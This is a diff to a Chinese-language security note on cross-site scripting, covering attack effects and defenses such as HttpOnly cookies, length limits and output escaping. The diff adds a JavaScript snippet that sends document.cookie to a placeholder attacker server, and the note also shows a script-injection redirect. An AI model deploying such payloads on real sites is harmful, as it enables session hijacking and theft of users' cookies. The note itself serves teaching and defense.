@@ -10,12 +10,20 @@ XSS的攻击过程都是在浏览器通过执行javascript脚本自动进行，�
 
 - 窃取网页浏览中的cookie值，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。
 
+  ```
+  var i=document.createElement("img");
+  document.body.appendChild(i);
+  i.src ="http://www.hackerserver.com/?c=" + document.cookie;
+  ```
+
+  
+
 - 劫持流量实现恶意跳转
 想办法插入一句像这样的语句：`<script>window.location.href="http://www.baidu.com";</script>`
 
 - 构建Get和Post请求
 
-XSS可以在javascript中构建get或者post请求，来实现自己的攻击
+  XSS可以在javascript中构建get或者post请求，来实现自己的攻击
 
 ### 防范手段
 1. 给关键的Cookie设置HttpOnly属性
@@ -27,8 +35,10 @@ XSS可以在javascript中构建get或者post请求，来实现自己的攻击
 
 最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。
 
-3. 输出检查
+3. 输出转义
 
 一般说来，除了富文本输出之外，在变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击
+
+把恶意代码摘除；如一些敏感关键字：<script>
 
 
